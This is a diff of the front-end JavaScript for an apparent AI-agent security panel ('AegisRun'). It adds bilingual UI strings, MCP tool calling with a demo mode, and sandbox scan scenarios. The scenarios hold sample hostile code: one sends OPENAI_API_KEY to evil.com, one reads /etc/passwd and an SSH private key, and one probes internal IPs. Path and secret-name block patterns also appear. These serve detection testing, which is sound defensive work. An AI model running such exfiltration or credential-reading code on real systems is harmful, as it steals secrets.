+    btn_scan: '扫描', btn_batch_register: '批量注册选中项',
+    btn_clear_file: '清除路径',
+    input_paste_code: '粘贴代码', input_file_path: '文件路径',
+    scan_dir_scanning: '扫描中...', scan_dir_empty: '未找到 .wasm 文件', scan_dir_found: '找到 {n} 个 .wasm 文件',
+    scan_dir_registered: '已注册', scan_dir_already: '（已在注册表中）',
+    batch_reg_ok: '批量注册完成：成功 {ok}/{total}', batch_reg_fail: '批量注册失败',
+    mcp_select_all: '全选', mcp_batch_call: '批量调用',
+    mcp_mode_demo: '演示模式', mcp_mode_real: '真实调用',
+    mcp_mode_demo_desc: '仅生成请求预览，不会真正发送到 MCP 端点。适合了解调用格式。',
+    mcp_mode_real_desc: '请求将直接发送到 MCP 端点执行，返回真实结果。',
+    mcp_batch_calling: '批量调用中...', mcp_selected_n: '已选 {n} 个工具',
+    mcp_no_selection: '请先选择至少一个工具',
+    example_tools_desc: '以下是几个常见的工具示例，帮助你了解工具的结构。点击「注册」即可将它们添加到注册表。',
   },
   en: {
     header_subtitle: 'Admin Panel',
-    nav_dashboard: 'Dashboard', nav_domains: 'Domain', nav_paths: 'Path', nav_env: 'Env', nav_tools: 'Tool', nav_audit: 'Audit', nav_sandbox: 'Sandbox', nav_mcp: 'MCP Agent',
+    nav_dashboard: 'Dashboard', nav_domains: 'Domain', nav_paths: 'Path', nav_env: 'Env', nav_tools: 'Tools', nav_audit: 'Audit', nav_sandbox: 'Sandbox', nav_mcp: 'MCP Agent',
     defense_layers: 'Defense Layers', statistics: 'Statistics', allowed: 'Allowed', blocked: 'Blocked', preset: 'Preset',
     domain_blacklist: 'Domain Blacklist', domain_whitelist: 'Domain Whitelist',
     path_blacklist: 'Path Blacklist', env_patterns: 'Sensitive Env Patterns', tool_blacklist: 'Tool Blacklist',
+    tool_blacklist_hint: 'Blocked tools are completely disabled and cannot run even if registered.',
     audit_log: 'Audit Log', btn_clear: 'Clear',
-    btn_block: 'Block', btn_allow: 'Allow', btn_add: 'Add', btn_run: 'Run', btn_clear2: 'Clear',
+    btn_block: 'Block', btn_allow: 'Allow', btn_add: 'Add', btn_run: 'Scan', btn_clear2: 'Clear',
+    dashboard_explain: 'AegisRun security panel. View defense layer status, interception stats, and policy presets. Switch presets to adjust security levels quickly; each defense layer can be toggled independently.',
+    domain_explain: 'Domain policy controls which network targets AI Agents can access. Blacklisted domains are blocked, whitelisted domains are allowed. Supports exact match and wildcards (e.g. <strong>evil.*</strong> matches all .evil subdomains).',
+    domain_blacklist_hint: 'Add domains you want to block. Agent calls matching the blacklist will be denied.',
+    domain_whitelist_hint: 'Add trusted target domains. Whitelist takes priority over blacklist.',
+    domain_blacklist_empty: 'No blocked domains yet',
+    domain_whitelist_empty: 'No allowed domains yet',
+    path_explain: 'Path policy controls which files AI Agents can read or write. Supports exact path match and wildcard prefix matching (e.g. <strong>~/.ssh/*</strong> matches all SSH config files and keys).',
+    path_blacklist_hint: 'Add paths you want to block. Supports wildcard <strong>*</strong>. Examples: <code>/etc/passwd</code>, <code>~/.ssh/*</code>, <code>C:\\Windows\\*</code>',
+    path_blacklist_empty: 'No blocked paths yet',
+    env_explain: 'Env policy controls which sensitive variables AI Agents can read. Variable names containing <strong>KEY</strong>, <strong>SECRET</strong>, <strong>TOKEN</strong>, <strong>PASSWORD</strong> etc. will be blocked. Customize patterns on this page.',
+    env_patterns_hint: 'Add custom sensitive env patterns (e.g. <strong>*_KEY</strong>, <strong>*_SECRET</strong>). Agent reads matching these patterns will be blocked.',
+    env_patterns_empty: 'No custom env patterns yet',
+    audit_explain: 'Audit log records every Agent invocation result, including domain checks, path checks, env checks, code scans, and sandbox execution. Each entry shows time, tool, action type, and final decision.',
+    audit_empty: 'No audit records yet',
+    audit_clear_confirm: 'Clear all audit logs? This action cannot be undone.',
     security_check: 'Security Check',
+    tool_explain: '"Tools" here are <strong>external capability plugins</strong> (MCP tools) that AI Agents can call — like weather lookup, code execution, or file search. Each tool is a standalone program. AegisRun helps you <strong>register</strong> new tools, <strong>search</strong> existing ones, and <strong>block</strong> dangerous ones to keep your Agent safe.',
+    sandbox_explain: 'Not sure if some code is safe? Click a scenario card below to test instantly, or paste your own code. AegisRun will analyze it for security risks.',
+    quick_scan: 'Quick Scan',
+    paste_hint: 'Click here to paste your code for scanning...',
+    mcp_explain: '<strong>MCP (Model Context Protocol)</strong> is the standard communication protocol between AI clients (like Claude Desktop, Codex) and security services. Add the address below to your AI client config to enable real-time policy checks, code scanning, and sandboxing.',
+    mcp_endpoint_hint: 'Add the following JSON to your AI client config file to connect:',
+    step1_text: 'Select a tool from the list above',
+    step2_text: 'Arguments are pre-filled, edit if needed',
+    step3_text: 'Click "Call" to see results',
+    select_tool_label: 'Select a tool:',
+    args_label: 'Arguments (JSON):',
     mode_static: 'Static Scan', mode_runtime: 'Runtime Sandbox',
     hint_static: 'Static analysis: scan source code for malicious patterns (env theft, data exfiltration, shell injection, etc.)',
     hint_runtime: 'Runtime sandbox: execute script with Python audit hooks to intercept open/env/network/subprocess at runtime.',
@@ -275,12 +544,44 @@ const I18N = {
     mcp_desc: 'Agent calls AegisRun via MCP for real-time policy checks, code scanning, and runtime sandboxing.',
     available_tools: 'Available Tools', loading: 'Loading...', btn_refresh_tools: 'Refresh Tools',
     interactive_call: 'Interactive Call', btn_call: 'Call',
-    finding_clean: 'CLEAN - no violations found', finding_blocked: 'BLOCKED', finding_flagged: 'FLAGGED',
-    checking: 'Checking...', scan_failed: 'Request failed',
+    finding_clean: 'No security issues found', finding_blocked: 'Blocked', finding_flagged: 'Flagged',
+    checking: 'Scanning...', scan_failed: 'Request failed',
     stat_static: 'Static', stat_runtime: 'Runtime', stat_blocked_label: 'Blocked',
     layer_runtime: 'Runtime Sandbox', layer_domain: 'Domain Blacklist', layer_path_env: 'Path + Env', layer_scanner: 'Scanner', layer_wasm: 'Wasm Sandbox',
     mcp_no_tools: 'No tools', mcp_unavailable: 'MCP endpoint unavailable',
     mcp_calling: 'Calling...', mcp_bad_json: 'Invalid JSON in arguments', mcp_call_failed: 'Call failed',
+    tool_registry: 'Tool Registry', btn_refresh: 'Refresh', btn_search: 'Search',
+    register_tool: 'Register Tool', btn_register: 'Register',
+    tool_count_label: 'Registered', no_tools: 'No registered tools',
+    tool_reg_success: 'Registered successfully', tool_reg_failed: 'Registration failed',
+    tool_unreg_confirm: 'Unregister this tool?', tool_unreg_success: 'Unregistered',
+    tag_cloud_title: 'Browse by Tag',
+    scenario_env_theft: 'Env Variable Theft',
+    scenario_env_theft_desc: 'Reads env var OPENAI_API_KEY, exfiltrates via requests to evil.com. Triggers: env(sensitive var) + host(malicious domain)',
+    scenario_data_leak: 'Sensitive File Access',
+    scenario_data_leak_desc: 'Reads /etc/passwd (password file) and ~/.ssh/id_rsa (SSH key). Triggers: path(sensitive system path)',
+    scenario_dns_hijack: 'Internal Network Probe',
+    scenario_dns_hijack_desc: 'Socket connects to internal IPs: 192.168.1.1, 10.0.0.1, 127.0.0.1. Triggers: host(private/reserved address)',
+    scenario_safe: 'Normal Weather Query',
+    scenario_safe_desc: 'Calls public weather API wttr.in/Shenzhen, no sensitive operations. Expected: ALLOW, 0 violations',
+    scenario_result_safe: 'Safe — all operations allowed',
+    scenario_result_blocked: 'Blocked — {n} violation(s) found',
+    cat_policy: 'Policy Check', cat_scan: 'Code Scan', cat_sandbox: 'Sandbox', cat_tools: 'Tool Mgmt',
+    example_tools: 'Example Tools', example_tools_hint: '— for reference, click "Register" to add instantly',
+    scan_dir: 'Scan Directory for Tools', scan_dir_hint: 'Specify a directory path to auto-scan .wasm files and batch register them as tools.',
+    btn_scan: 'Scan', btn_batch_register: 'Batch Register Selected',
+    btn_clear_file: 'Clear path',
+    input_paste_code: 'Paste Code', input_file_path: 'File Path',
+    scan_dir_scanning: 'Scanning...', scan_dir_empty: 'No .wasm files found', scan_dir_found: 'Found {n} .wasm file(s)',
+    scan_dir_registered: 'Registered', scan_dir_already: '(already registered)',
+    batch_reg_ok: 'Batch registration done: {ok}/{total} succeeded', batch_reg_fail: 'Batch registration failed',
+    mcp_select_all: 'Select All', mcp_batch_call: 'Batch Call',
+    mcp_mode_demo: 'Demo Mode', mcp_mode_real: 'Real Call',
+    mcp_mode_demo_desc: 'Only generates a request preview — nothing is sent to the MCP endpoint. Good for learning the format.',
+    mcp_mode_real_desc: 'Requests are sent directly to the MCP endpoint for real execution with live results.',
+    mcp_batch_calling: 'Batch calling...', mcp_selected_n: '{n} tool(s) selected',
+    mcp_no_selection: 'Please select at least one tool first',
+    example_tools_desc: 'Here are some common tool examples to help you understand the structure. Click "Register" to add them to the registry.',
   }
 };
 let currentLang = 'zh';
@@ -294,12 +595,34 @@ function applyI18n() {
       el.textContent = I18N[currentLang][key];
     }
   });
-  // Dynamic text that changes with sandbox mode
-  document.getElementById('sandbox-mode-hint').textContent = t(sandboxMode === 'runtime' ? 'hint_runtime' : 'hint_static');
-  // MCP desc
-  document.getElementById('mcp-desc').textContent = t('mcp_desc');
-  // Re-render defense layer names
+  // info-banner with HTML content
+  document.querySelectorAll('.info-banner [data-i18n]').forEach(el => {
+    const key = el.getAttribute('data-i18n');
+    if (I18N[currentLang] && I18N[currentLang][key]) {
+      el.innerHTML = I18N[currentLang][key];
+    }
+  });
+  // Re-render dynamic sections
   renderDefense();
+  renderScenarios();
+  if(toolRegistryData) renderToolRegistry(toolRegistryData);
+  renderExampleTools();
+  // Update MCP mode labels
+  if(typeof mcpDemoMode !== 'undefined') {
+    const label = document.getElementById('mcp-mode-label');
+    const desc = document.getElementById('mcp-mode-desc');
+    const badge = document.getElementById('mcp-mode-badge');
+    if(label) label.textContent = mcpDemoMode ? t('mcp_mode_demo') : t('mcp_mode_real');
+    if(desc) desc.textContent = mcpDemoMode ? t('mcp_mode_demo_desc') : t('mcp_mode_real_desc');
+    if(badge) { badge.textContent = mcpDemoMode ? t('mcp_mode_demo') : t('mcp_mode_real'); badge.className = 'mode-indicator ' + (mcpDemoMode ? 'demo' : 'real'); }
+  }
+  // Update paste zone text
+  const pz = document.getElementById('paste-zone');
+  if(pz && !document.getElementById('sandbox-code').value) pz.textContent = t('paste_hint');
+  // Update sandbox mode hint
+  const modeBtn = document.querySelector('#sandbox-mode .active');
+  const hintEl = document.getElementById('sandbox-mode-hint');
+  if (modeBtn && hintEl) hintEl.textContent = modeBtn.dataset.mode === 'runtime' ? t('hint_runtime') : t('hint_static');
 }
 
 function setLang(lang, btn) {
@@ -311,7 +634,6 @@ function setLang(lang, btn) {
 
 // ── State ──
 let policy = {};
-let sandboxMode = 'static';
 const LAYER_NAMES = {
   zh: {layer1:'运行时沙箱',layer2:'域名黑名单',layer3:'路径+环境变量',layer4:'扫描器',layer5:'Wasm 沙箱'},
   en: {layer1:'Runtime Sandbox',layer2:'Domain Blacklist',layer3:'Path + Env',layer4:'Scanner',layer5:'Wasm Sandbox'}
@@ -326,6 +648,7 @@ function render(){
   renderTags('path-blacklist', (policy.blocked_paths||[]));
   renderTags('env-patterns', (policy.blocked_env_patterns||[]));
   renderTags('tool-blacklist', []);
+  fetchToolRegistry();
 }
 function renderDefense(){
   const names = LAYER_NAMES[currentLang] || LAYER_NAMES.en;
@@ -341,6 +664,12 @@ function renderStats(){
 }
 function renderTags(id,items){
   const map={'domain-blacklist':'domain','domain-whitelist':'domain','path-blacklist':'path','env-patterns':'env','tool-blacklist':'tool'};
+  const EMPTY_KEYS = {'domain-blacklist':'domain_blacklist_empty','domain-whitelist':'domain_whitelist_empty','path-blacklist':'path_blacklist_empty','env-patterns':'env_patterns_empty'};
+  if (!items.length) {
+    const emptyKey = EMPTY_KEYS[id];
+    document.getElementById(id).innerHTML = emptyKey ? '<div style="color:var(--dim);font-size:12px;padding:12px 0">' + t(emptyKey) + '</div>' : '';
+    return;
+  }
   document.getElementById(id).innerHTML = items.map(v=>`<span class="tag ${id==='domain-whitelist'?'tag-allow':'tag-block'}" onclick="fetch('/api/unblock/${map[id]||'domain'}/${encodeURIComponent(v)}',{method:'POST'}).then(()=>fetchPolicy())">${v} &times;</span>`).join('');
 }
 function fetchPolicy(){
@@ -368,39 +697,165 @@ function switchTab(tab,btn){
   document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active'));
   if(btn)btn.classList.add('active');
   if(tab==='mcp') fetchMcpTools();
+  if(tab==='tools') { fetchToolRegistry(); renderExampleTools(); }
+  if(tab==='sandbox') renderScenarios();
 }
 
 // ── Sandbox ──
-function setSandboxMode(mode,btn){
-  sandboxMode=mode;
-  document.querySelectorAll('#sandbox .seg-ctrl button').forEach(b=>b.classList.remove('active'));
-  btn.classList.add('active');
-  document.getElementById('sandbox-mode-hint').textContent = t(mode==='runtime' ? 'hint_runtime' : 'hint_static');
+const SCENARIOS = [
+  { key: 'env_theft', badge: 'danger', code: 'import os\nkey = os.environ.get("OPENAI_API_KEY")\nimport requests\nrequests.post("https://evil.com/steal", data={"key": key})' },
+  { key: 'data_leak', badge: 'danger', code: 'f = open("/etc/passwd")\ndata = f.read()\nf2 = open(os.path.expanduser("~/.ssh/id_rsa"))\nprint(f2.read())' },
+  { key: 'dns_hijack', badge: 'warn', code: 'import socket\ns = socket.socket()\ns.connect(("192.168.1.1", 22))\ns.connect(("10.0.0.1", 80))\ns.connect(("127.0.0.1", 8080))' },
+  { key: 'safe', badge: 'safe', code: 'import requests\nr = requests.get("https://wttr.in/Shenzhen?format=3")\nprint(r.text)' },
+];
+
+function renderScenarios() {
+  const grid = document.getElementById('scenario-grid');
+  if(!grid) return;
+  grid.innerHTML = SCENARIOS.map((s, i) => {
+    const title = t('scenario_' + s.key);
+    const desc = t('scenario_' + s.key + '_desc');
+    return '<div class="scenario-card" onclick="runScenario(' + i + ')" id="scenario-' + i + '">' +
+      '<div class="scenario-title">' + escHtml(title) + ' <span class="scenario-badge ' + s.badge + '">' + (s.badge === 'safe' ? 'SAFE' : s.badge === 'warn' ? 'WARN' : 'DANGER') + '</span></div>' +
+      '<div class="scenario-desc">' + escHtml(desc) + '</div>' +
+    '</div>';
+  }).join('');
 }
-function runCheck(){
-  const code=document.getElementById('sandbox-code').value;
-  const resultEl=document.getElementById('sandbox-result');
-  resultEl.innerHTML=`<span style="color:var(--dim)">${t('checking')}</span>`;
-  const endpoint = sandboxMode==='runtime' ? '/api/sandbox-run' : '/api/scan';
-  fetch(endpoint,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:code})})
-    .then(r=>r.json()).then(d=>{
-      let h='';
-      if(sandboxMode==='runtime' && d.static_findings!==undefined){
-        h+=`<div style="margin-bottom:6px;font-size:12px;color:var(--dim)">${t('stat_static')}: ${d.static_findings} | ${t('stat_runtime')}: ${d.runtime_findings} | ${t('stat_blocked_label')}: <strong style="color:${d.violations>0?'var(--red)':'var(--green)'}">${d.violations}</strong></div>`;
+
+function runScenario(idx) {
+  const s = SCENARIOS[idx];
+  // Scenario cards always switch to paste mode
+  const pasteBtn = document.querySelector('#sandbox-input-mode [data-mode="paste"]');
+  if (pasteBtn) switchInputMode('paste', pasteBtn);
+  const codeEl = document.getElementById('sandbox-code');
+  codeEl.value = s.code;
+  codeEl.style.display = 'block';
+  document.getElementById('paste-zone').style.display = 'none';
+  // Show scanning animation
+  const card = document.getElementById('scenario-' + idx);
+  card.classList.add('scanning');
+  // Auto-run
+  runCheck(function() { card.classList.remove('scanning'); });
+}
+
+function clearSandbox() {
+  document.getElementById('sandbox-code').value = '';
+  document.getElementById('sandbox-code').style.display = 'none';
+  document.getElementById('sandbox-file-path').value = '';
+  document.getElementById('sandbox-result').innerHTML = '';
+  document.getElementById('paste-zone').style.display = 'block';
+  document.getElementById('paste-zone').textContent = t('paste_hint');
+  document.querySelectorAll('.scenario-card').forEach(c => c.classList.remove('scanning'));
+}
+
+function showCodeInput() {
+  document.getElementById('sandbox-code').style.display = 'block';
+  document.getElementById('paste-zone').style.display = 'none';
+  document.getElementById('sandbox-code').focus();
+}
+
+function updatePasteZone() {
+  const val = document.getElementById('sandbox-code').value;
+  if(!val.trim()) {
+    document.getElementById('sandbox-code').style.display = 'none';
+    document.getElementById('paste-zone').style.display = 'block';
+    document.getElementById('paste-zone').textContent = t('paste_hint');
+  }
+}
+
+function switchSandboxMode(mode, btn) {
+  document.querySelectorAll('#sandbox-mode button').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+  const hintEl = document.getElementById('sandbox-mode-hint');
+  if (hintEl) hintEl.textContent = mode === 'runtime' ? t('hint_runtime') : t('hint_static');
+}
+
+function switchInputMode(mode, btn) {
+  document.querySelectorAll('#sandbox-input-mode button').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+  const codeEl = document.getElementById('sandbox-code');
+  const pathEl = document.getElementById('sandbox-file-path');
+  const pasteZone = document.getElementById('paste-zone');
+  const pathRow = document.getElementById('file-path-row');
+  const clearBtn = document.getElementById('btn-clear-path');
+  if (mode === 'file') {
+    codeEl.style.display = 'none';
+    pasteZone.style.display = 'none';
+    pathEl.style.display = 'block';
+    pathRow.style.display = 'flex';
+    clearBtn.style.display = 'inline-block';
+    pathEl.focus();
+  } else {
+    pathEl.style.display = 'none';
+    pathRow.style.display = 'none';
+    clearBtn.style.display = 'none';
+    if (!codeEl.value.trim()) {
+      codeEl.style.display = 'none';
+      pasteZone.style.display = 'block';
+      pasteZone.textContent = t('paste_hint');
+    } else {
+      codeEl.style.display = 'block';
+      pasteZone.style.display = 'none';
+    }
+  }
+}
+
+function clearFilePath() {
+  document.getElementById('sandbox-file-path').value = '';
+}
+
+function runCheck(callback) {
+  const resultEl = document.getElementById('sandbox-result');
+  const modeBtn = document.querySelector('#sandbox-mode .active');
+  const isRuntime = modeBtn && modeBtn.dataset.mode === 'runtime';
+  const endpoint = isRuntime ? '/api/sandbox-run' : '/api/scan';
+  const isFileMode = document.querySelector('#sandbox-input-mode .active')?.dataset.mode === 'file';
+  let body;
+  if (isFileMode) {
+    const filePath = document.getElementById('sandbox-file-path').value.trim();
+    if (!filePath) return;
+    body = JSON.stringify({ path: filePath });
+  } else {
+    const code = document.getElementById('sandbox-code').value;
+    if (!code.trim()) { clearSandbox(); return; }
+    body = JSON.stringify({ code: code });
+  }
+  resultEl.innerHTML = '<span style="color:var(--dim)">' + t('checking') + '</span>';
+  fetch(endpoint, {method:'POST', headers:{'Content-Type':'application/json'}, body:body})
+    .then(r => r.json()).then(d => {
+      let h = '';
+      // Handle error responses (file not found, etc.)
+      if (d.error) {
+        h += '<div class="result-summary fail"><span class="result-icon">&#10007;</span> ' + escHtml(d.error) + '</div>';
+        resultEl.innerHTML = h;
+        if (callback) callback();
+        return;
       }
-      if(!d.findings||!d.findings.length){
-        h+=`<div class="finding-line finding-allowed">${t('finding_clean')}</div>`;
+      // Show file path if scanned from file
+      if (d.path) {
+        h += '<div style="font-size:11px;color:var(--dim);margin-bottom:8px;font-family:monospace">&#128196; ' + escHtml(d.path) + '</div>';
+      }
+      const findings = d.findings || [];
+      const blocked = findings.filter(f => f.blocked).length;
+      // Summary banner
+      if(findings.length === 0) {
+        h += '<div class="result-summary pass"><span class="result-icon">&#10003;</span> ' + t('finding_clean') + '</div>';
       } else {
-        d.findings.forEach(function(f){
-          const cls=f.blocked?'finding-blocked':'finding-flagged';
-          const tag=f.blocked?t('finding_blocked'):t('finding_flagged');
-          const line=f.line>0?'L'+f.line+' ':'';
-          h+=`<div class="finding-line ${cls}">${line}[${f.kind}] ${escHtml(f.value)} &mdash; ${tag}</div>`;
+        h += '<div class="result-summary fail"><span class="result-icon">&#10007;</span> ' + t('scenario_result_blocked').replace('{n}', blocked) + '</div>';
+        findings.forEach(function(f) {
+          const cls = f.blocked ? 'finding-blocked' : 'finding-flagged';
+          const tag = f.blocked ? t('finding_blocked') : t('finding_flagged');
+          const line = f.line > 0 ? 'L' + f.line + ' ' : '';
+          h += '<div class="finding-line ' + cls + '">' + line + '[' + escHtml(f.kind) + '] ' + escHtml(f.value) + ' — ' + tag + '</div>';
         });
       }
-      resultEl.innerHTML=h;
+      resultEl.innerHTML = h;
       fetchAudit();
-    }).catch(()=>{resultEl.innerHTML=`<span style="color:var(--red)">${t('scan_failed')}</span>`;});
+      if(callback) callback();
+    }).catch(() => {
+      resultEl.innerHTML = '<span style="color:var(--red)">' + t('scan_failed') + '</span>';
+      if(callback) callback();
+    });
 }
 
 // ── MCP ──
@@ -413,23 +868,101 @@ const mcpToolArgs = {
   'aegisrun.policy.summary': '{}',
   'aegisrun.scan_file': '{\n  "path": "test.py"\n}',
   'aegisrun.sandbox_python': '{\n  "path": "test.py"\n}',
-  'aegisrun.sandbox_wasm': '{\n  "wasm": "tool.wasm"\n}'
+  'aegisrun.sandbox_wasm': '{\n  "wasm": "tool.wasm"\n}',
+  'aegisrun.tools.list': '{}',
+  'aegisrun.tools.search': '{\n  "keyword": "weather"\n}',
+  'aegisrun.tools.tags': '{\n  "tags": ["net", "security"]\n}',
+  'aegisrun.tools.get': '{\n  "tool_id": "weather-query"\n}'
 };
-function onMcpToolChange(){
-  const toolName=document.getElementById('mcp-tool-select').value;
-  document.getElementById('mcp-args').value=mcpToolArgs[toolName]||'{}';
+
+const MCP_TOOL_HINTS = {
+  'aegisrun.policy.check_domain': { zh: '检查一个域名是否在黑名单中。输入域名，返回 Allow 或 Deny。', en: 'Check if a domain is blacklisted. Returns Allow or Deny.' },
+  'aegisrun.policy.check_path': { zh: '检查一个文件路径是否被禁止访问。如 /etc/passwd、~/.ssh/ 等。', en: 'Check if a file path is blocked. e.g. /etc/passwd, ~/.ssh/.' },
+  'aegisrun.policy.check_env': { zh: '检查一个环境变量名是否敏感。含 KEY/SECRET/TOKEN 等关键词的会被拦截。', en: 'Check if an env variable name is sensitive. Names containing KEY/SECRET/TOKEN are blocked.' },
+  'aegisrun.guard_tool_call': { zh: '综合检查一次工具调用：同时验证域名、路径、环境变量和命令。', en: 'Comprehensive check for a tool call: validates domains, paths, env vars, and command together.' },
+  'aegisrun.scan_code': { zh: '扫描一段源代码，找出其中的恶意模式（环境变量窃取、数据外泄等）。', en: 'Scan source code for malicious patterns (env theft, data exfiltration, etc.).' },
+  'aegisrun.policy.summary': { zh: '获取当前策略的摘要信息，包括黑名单数量、预设名称等。', en: 'Get a summary of the current policy, including blacklist counts and preset name.' },
+  'aegisrun.scan_file': { zh: '扫描一个文件（通过路径），分析其中的安全威胁。', en: 'Scan a file by path for security threats.' },
+  'aegisrun.sandbox_python': { zh: '在运行时沙箱中执行 Python 脚本，拦截危险操作。', en: 'Execute a Python script in the runtime sandbox, intercepting dangerous operations.' },
+  'aegisrun.sandbox_wasm': { zh: '在 WASI 沙箱中运行 Wasm 工具，实现物理级隔离。', en: 'Run a Wasm tool in the WASI sandbox for physical-level isolation.' },
+  'aegisrun.tools.list': { zh: '列出所有已注册的工具。', en: 'List all registered tools.' },
+  'aegisrun.tools.search': { zh: '按关键词搜索已注册的工具。', en: 'Search registered tools by keyword.' },
+  'aegisrun.tools.tags': { zh: '按标签筛选工具。如 "net"、"security" 等。', en: 'Filter tools by tags. e.g. "net", "security".' },
+  'aegisrun.tools.get': { zh: '按 tool_id 查询单个工具的详细信息。', en: 'Get detailed info for a single tool by tool_id.' },
+};
+
+function getToolCategory(name) {
+  if(name.includes('check_') || name.includes('guard') || name.includes('summary')) return 'cat_policy';
+  if(name.includes('scan')) return 'cat_scan';
+  if(name.includes('sandbox')) return 'cat_sandbox';
+  if(name.includes('tools.')) return 'cat_tools';
+  return 'cat_policy';
 }
+
+function onMcpToolChange(){
+  const toolName = document.getElementById('mcp-tool-select').value;
+  document.getElementById('mcp-args').value = mcpToolArgs[toolName] || '{}';
+  // Show hint
+  const hint = MCP_TOOL_HINTS[toolName];
+  const hintEl = document.getElementById('mcp-tool-hint');
+  if(hint && hintEl) {
+    hintEl.textContent = hint[currentLang] || hint.en || '';
+  }
+}
+
+let mcpToolsCache = [];
+
 function fetchMcpTools(){
   fetch('/mcp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:1,method:'tools/list'})})
     .then(r=>r.json()).then(d=>{
-      const tools=(d.result&&d.result.tools)||[];
-      const el=document.getElementById('mcp-tools');
-      if(!tools.length){el.textContent=t('mcp_no_tools');return;}
-      el.innerHTML=tools.map(t=>`<div class="mcp-tool"><div class="mcp-tool-name">${t.name}</div><div class="mcp-tool-desc">${escHtml(t.description)}</div></div>`).join('');
-      const sel=document.getElementById('mcp-tool-select');
-      sel.innerHTML=tools.map(t=>`<option value="${t.name}">${t.name.replace('aegisrun.','')}</option>`).join('');
+      const tools = (d.result && d.result.tools) || [];
+      mcpToolsCache = tools;
+      const el = document.getElementById('mcp-tools');
+      const countEl = document.getElementById('mcp-tool-count');
+      if(!tools.length){ el.textContent = t('mcp_no_tools'); if(countEl) countEl.textContent = ''; return; }
+      if(countEl) countEl.textContent = '(' + tools.length + ')';
+      // Show select-all and batch bar
+      document.getElementById('mcp-select-all-wrap').style.display = 'block';
+      // Group by category
+      const groups = {};
+      tools.forEach(tool => {
+        const cat = getToolCategory(tool.name);
+        if(!groups[cat]) groups[cat] = [];
+        groups[cat].push(tool);
+      });
+      // Render grouped with checkboxes
+      let h = '';
+      Object.entries(groups).forEach(([cat, catTools]) => {
+        h += '<div style="font-size:11px;color:var(--purple);font-weight:600;margin:10px 0 6px;text-transform:uppercase;letter-spacing:.5px">' + t(cat) + '</div>';
+        catTools.forEach(tool => {
+          h += '<div class="mcp-tool-check">' +
+            '<input type="checkbox" class="mcp-tool-cb" value="' + escHtml(tool.name) + '" onchange="updateMcpBatchBar()" style="width:auto;margin:3px 0 0;accent-color:var(--accent)">' +
+            '<div class="tool-card-body mcp-tool-card" onclick="selectMcpTool(\'' + tool.name + '\')">' +
+              '<div class="tool-name">' + escHtml(tool.name.replace('aegisrun.', '')) + '</div>' +
+              '<div class="tool-desc">' + escHtml(tool.description) + '</div>' +
+            '</div>' +
+          '</div>';
+        });
+      });
+      el.innerHTML = h;
+      // Update select dropdown
+      const sel = document.getElementById('mcp-tool-select');
+      sel.innerHTML = tools.map(tool => '<option value="' + tool.name + '">' + tool.name.replace('aegisrun.', '') + '</option>').join('');
       onMcpToolChange();
-    }).catch(()=>{document.getElementById('mcp-tools').textContent=t('mcp_unavailable');});
+    }).catch(() => { document.getElementById('mcp-tools').textContent = t('mcp_unavailable'); });
+}
+
+function selectMcpTool(name) {
+  document.getElementById('mcp-tool-select').value = name;
+  onMcpToolChange();
+  // Highlight selected card
+  document.querySelectorAll('.mcp-tool-card').forEach(c => c.classList.remove('selected'));
+  event.currentTarget.classList.add('selected');
+  // Check the checkbox for this tool
+  const cb = document.querySelector('.mcp-tool-cb[value="' + name + '"]');
+  if (cb) { cb.checked = true; updateMcpBatchBar(); }
+  // Scroll to interactive section
+  document.getElementById('mcp-tool-hint').scrollIntoView({ behavior: 'smooth', block: 'center' });
 }
 function callMcpTool(){
   const toolName=document.getElementById('mcp-tool-select').value;
@@ -437,9 +970,18 @@ function callMcpTool(){
   const resultEl=document.getElementById('mcp-call-result');
   let args;
   try{args=JSON.parse(argsText);}catch(e){resultEl.innerHTML=`<span style="color:var(--red)">${t('mcp_bad_json')}</span>`;return;}
+  const payload={jsonrpc:'2.0',id:Date.now(),method:'tools/call',params:{name:toolName,arguments:args}};
+  // Demo mode: show request preview
+  if(mcpDemoMode){
+    let h='<div style="margin-bottom:8px;padding:8px 12px;background:#3b2e1a;border:1px solid var(--orange);border-radius:6px;font-size:12px;color:var(--orange);font-weight:600">';
+    h+=t('mcp_mode_demo') + ' — ' + t('mcp_mode_demo_desc') + '</div>';
+    h+='<div style="font-size:11px;color:var(--dim);margin-bottom:4px">POST /mcp</div>';
+    h+='<pre>'+escHtml(JSON.stringify(payload,null,2))+'</pre>';
+    resultEl.innerHTML=h;
+    return;
+  }
   resultEl.innerHTML=`<span style="color:var(--dim)">${t('mcp_calling')}</span>`;
-  const body=JSON.stringify({jsonrpc:'2.0',id:Date.now(),method:'tools/call',params:{name:toolName,arguments:args}});
-  fetch('/mcp',{method:'POST',headers:{'Content-Type':'application/json'},body:body})
+  fetch('/mcp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)})
     .then(r=>r.json()).then(d=>{
       if(d.error){
         resultEl.innerHTML=`<pre style="color:var(--red)">${JSON.stringify(d.error,null,2)}</pre>`;
@@ -458,15 +1000,386 @@ function callMcpTool(){
     }).catch(()=>{resultEl.innerHTML=`<span style="color:var(--red)">${t('mcp_call_failed')}</span>`;});
 }
 
+// ── MCP Multi-Select & Demo Mode ──
+let mcpDemoMode = true;
+
+function toggleMcpMode() {
+  mcpDemoMode = !document.getElementById('mcp-mode-toggle').checked;
+  const label = document.getElementById('mcp-mode-label');
+  const desc = document.getElementById('mcp-mode-desc');
+  const badge = document.getElementById('mcp-mode-badge');
+  if (mcpDemoMode) {
+    label.textContent = t('mcp_mode_demo');
+    desc.textContent = t('mcp_mode_demo_desc');
+    badge.textContent = t('mcp_mode_demo');
+    badge.className = 'mode-indicator demo';
+  } else {
+    label.textContent = t('mcp_mode_real');
+    desc.textContent = t('mcp_mode_real_desc');
+    badge.textContent = t('mcp_mode_real');
+    badge.className = 'mode-indicator real';
+  }
+}
+
+function toggleSelectAllMcp() {
+  const checked = document.getElementById('mcp-select-all').checked;
+  document.querySelectorAll('.mcp-tool-cb').forEach(cb => { cb.checked = checked; });
+  updateMcpBatchBar();
+}
+
+function updateMcpBatchBar() {
+  const cbs = document.querySelectorAll('.mcp-tool-cb:checked');
+  const bar = document.getElementById('mcp-batch-bar');
+  const countEl = document.getElementById('mcp-selected-count');
+  if (cbs.length > 0) {
+    bar.style.display = 'flex';
